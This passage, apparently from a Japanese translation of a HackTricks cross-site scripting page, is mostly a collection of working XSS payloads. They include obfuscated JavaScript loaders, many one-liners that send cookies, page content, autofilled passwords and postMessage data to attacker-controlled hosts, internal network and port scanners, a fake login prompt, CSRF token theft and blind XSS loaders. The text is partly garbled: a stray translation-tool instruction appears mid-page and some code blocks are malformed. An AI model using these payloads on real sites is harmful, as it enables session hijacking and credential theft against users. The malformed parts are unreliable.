<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>

```javascript
//aaencode
```html
<p>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');</p>
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS一般的なペイロード

### 複数のペイロードを1つにまとめる

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### クッキーの取得
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
JavaScriptからクッキーにアクセスすることはできませんが、クッキーにHTTPOnlyフラグが設定されている場合は。しかし、[幸運な場合には、この保護をバイパスする方法](../hacking-with-cookies/#httponly)があります。
{% endhint %}

### ページのコンテンツを盗む
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### 内部IPを見つける

To find internal IP addresses, you can use various techniques:

#### 1. DNS Rebinding

DNS rebinding is a technique that allows an attacker to bypass the same-origin policy and access internal resources. By setting up a malicious website and exploiting vulnerabilities in the victim's browser, an attacker can trick the browser into making requests to internal IP addresses.

#### 2. Server-Side Request Forgery (SSRF)

SSRF is a vulnerability that allows an attacker to make requests from the server to arbitrary destinations, including internal IP addresses. By exploiting SSRF vulnerabilities in a web application, an attacker can force the server to make requests to internal resources and reveal their IP addresses.

#### 3. Cross-Site Scripting (XSS)

XSS vulnerabilities can be used to execute malicious scripts in a victim's browser. By injecting a script that makes requests to internal IP addresses, an attacker can obtain the IP addresses of internal resources.

#### 4. Port Scanning

Port scanning is a technique used to discover open ports on a target system. By scanning the IP range of the internal network, an attacker can identify internal IP addresses that are associated with open ports.

#### 5. Network Sniffing

Network sniffing involves capturing and analyzing network traffic to gather information about the network. By sniffing the internal network, an attacker can identify internal IP addresses that are communicating with the target system.

Remember to always obtain proper authorization before performing any of these techniques.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### ポートスキャナー（fetch）

The `fetch` method is a technique used to scan for open ports on a target system. It works by sending a request to each port and analyzing the response received. This can help identify potential entry points for further exploitation.

To use the `fetch` method, follow these steps:

1. Identify the target system's IP address.
2. Determine the range of ports to scan (e.g., 1-1000).
3. Write a script or use a tool that sends requests to each port in the specified range.
4. Analyze the responses received. If a response is received, the port is likely open.
5. Take note of the open ports for further analysis and exploitation.

It's important to note that port scanning can be considered intrusive and may be illegal without proper authorization. Always ensure you have the necessary permissions before conducting any port scanning activities.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### ポートスキャナー（ウェブソケット）

This technique allows an attacker to scan for open ports on a target system using websockets. By sending websocket connection requests to different ports and analyzing the response, the attacker can determine which ports are open and potentially vulnerable to further exploitation.

To perform a port scan using websockets, the attacker can use tools like `wscat` or develop a custom script. The basic steps involved in this technique are as follows:

1. Establish a websocket connection with the target system by sending a websocket handshake request.
2. Send a payload to the target system, which includes the port number to be scanned.
3. Analyze the response received from the target system. If the response indicates a successful connection, the port is open. Otherwise, the port is closed.
4. Repeat steps 2 and 3 for each port to be scanned.

It is important to note that port scanning is a potentially intrusive activity and may be illegal or against the terms of service of certain systems. Therefore, it should only be performed with proper authorization and for legitimate security testing purposes.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_短い時間は応答ポートを示し、長い時間は応答がないことを示します。_

Chromeで禁止されているポートのリストは[**こちら**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc)で確認できます。Firefoxで禁止されているポートのリストは[**こちら**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)です。

### 資格情報を要求するボックス
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 自動入力パスワードのキャプチャ

Auto-fill passwords capture is a technique used to exploit cross-site scripting (XSS) vulnerabilities in web applications. This technique allows an attacker to capture passwords that are automatically filled in by the browser's password manager.

To perform this attack, the attacker injects malicious code into a vulnerable web page. This code is designed to capture the values of input fields, including passwords, and send them to a remote server controlled by the attacker.

The attacker can then use the captured passwords to gain unauthorized access to user accounts or perform other malicious activities.

To protect against auto-fill passwords capture attacks, web developers should implement proper input validation and output encoding to prevent XSS vulnerabilities. Additionally, users should be cautious when entering sensitive information on websites and consider using password managers that require manual input rather than auto-fill features.

By understanding and mitigating the risks associated with auto-fill passwords capture, web applications can be better protected against this type of attack.
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
パスワードフィールドにデータが入力されると、ユーザー名とパスワードが攻撃者のサーバーに送信されます。クライアントが保存されたパスワードを選択して何も入力しない場合でも、資格情報は外部に漏洩します。

### キーロガー

GitHubで検索すると、いくつかの異なるものが見つかります:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* metasploitの`http_javascript_keylogger`も使用できます。

### CSRFトークンの盗み出し
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessageメッセージの盗み出し

PostMessageメッセージの盗み出しは、クロスサイトスクリプティング（XSS）の一種です。この攻撃では、攻撃者は悪意のあるスクリプトを使用して、PostMessageを介して送信されるメッセージを盗み出します。

攻撃者は、以下の手順に従ってPostMessageメッセージを盗み出すことができます。

1. 攻撃者は、悪意のあるスクリプトをターゲットのウェブページに挿入します。
2. 悪意のあるスクリプトは、PostMessageを使用してメッセージを送信するためのイベントリスナーを設定します。
3. ターゲットのウェブページがPostMessageを使用してメッセージを送信すると、悪意のあるスクリプトはそのメッセージをキャプチャします。
4. 悪意のあるスクリプトは、キャプチャしたメッセージを攻撃者のサーバーに送信します。

この攻撃により、攻撃者はターゲットのウェブページ上で送信されるすべてのPostMessageメッセージを盗み出すことができます。これにより、攻撃者は機密情報や個人情報を入手することができます。

この攻撃を防ぐためには、以下の対策を実施する必要があります。

- クロスサイトスクリプティング（XSS）の脆弱性を修正する。
- クリックジャッキング攻撃を防ぐために、適切なフレームオプションを設定する。
- セキュリティヘッダーを適切に設定する。

以上が、PostMessageメッセージの盗み出しについての概要です。この攻撃に対する理解と対策の実施が重要です。
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Service Workersの悪用

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### ポリグロット

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Blind XSSペイロード

以下のサイトも利用できます: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### 隠されたコンテンツを見つける

[**この解説記事**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)から、いくつかの値がJSから消えても、それらを異なるオブジェクトのJS属性で見つけることができることがわかります。例えば、正規表現の入力の値が削除された後でも、その入力の値を見つけることができます。
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### ブルートフォースリスト

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## 他の脆弱性を悪用したXSS

### Markdown内のXSS

レンダリングされるMarkdownコードを注入できますか？もしかしたらXSSを取得できるかもしれません！チェックしてください：

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSSからSSRFへ

**キャッシュを使用するサイト**でXSSを取得しましたか？このペイロードを使用して、Edge Side Include Injectionを介して**SSRFにアップグレード**してみてください：
```python
<esi:include src="http://yoursite.com/capture" />
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、/hive/hacktricks/pentesting-web/xss-cross-site-scripting/README.mdファイルからのものです。関連する英文を日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどのものは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

### 動的に作成されたPDF内のXSS

ウェブページがユーザーが制御する入力を使用してPDFを作成している場合、PDFを作成している**ボットをだます**ことで、**任意のJSコードを実行**させることができます。\
したがって、**PDF作成ボットが**いくつかの種類の**HTML** **タグを見つけると**、それらを**解釈**し、これを**悪用**して**サーバーXSS**を引き起こすことができます。

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

HTMLタグを挿入できない場合は、**PDFデータを挿入**してみる価値があります。

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### Amp4Email内のXSS

AMPは、モバイルクライアント上で超高速なウェブページを開発するための技術です。**AMPはJavaScriptでバックアップされたHTMLタグのセット**であり、パフォーマンスとセキュリティに重点を置いた機能を簡単に有効にすることができます。[AMPコンポーネント](https://amp.dev/documentation/components/?format=websites)には、カルーセル、レスポンシブフォーム要素、リモートエンドポイントからの新鮮なコンテンツの取得など、あらゆるものがあります。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/)形式では、電子メールメッセージで使用できる[AMPコンポーネントのサブセット](https://github.com/ampproject/amphtml/blob/master/docs/spec/email/amp-email-components.md)が提供されています。AMPメールの受信者は、電子メール内で直接AMPコンポーネントを表示および操作することができます。

例：[**GmailのAmp4Email内のXSSに関する記事**](https://adico.me/post/xss-in-gmail-s-amp4email)。

### ファイルのアップロードによるXSS（svg）

次のようなファイルを画像としてアップロードします（[http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)から）：
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
